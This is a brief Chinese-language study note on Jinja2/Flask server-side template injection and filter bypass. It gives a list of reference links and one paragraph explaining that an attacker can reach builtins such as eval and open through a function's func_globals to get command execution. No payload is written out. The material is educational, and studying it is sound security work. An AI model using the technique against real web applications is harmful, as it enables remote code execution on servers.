[细说Jinja2之SSTI&bypass](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652868785&idx=1&sn=aea3849c8ee1cdc50ad0742744159800&chksm=bd59ec7c8a2e656a4f9f5b0753c6bef4efeae17ca9a5ab3d550fdac9b302adf3696c1c432eb1&mpshare=1&scene=23&srcid=1219HTr8L8YaCVw9dnE3xDUj&sharer_sharetime=1608375002321&sharer_shareid=39123bd44a937bb35fd979cc8098127f#rd)

[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)

[Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)

[浅谈flask ssti 绕过原理](https://xz.aliyun.com/t/8029)

[Python沙箱逃逸的n种姿势](https://xz.aliyun.com/t/52)

[Python实现全角半角字符互转的方法](https://www.jb51.net/article/98443.htm)

## 注意

## 命令执行构造

在{{}}我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins

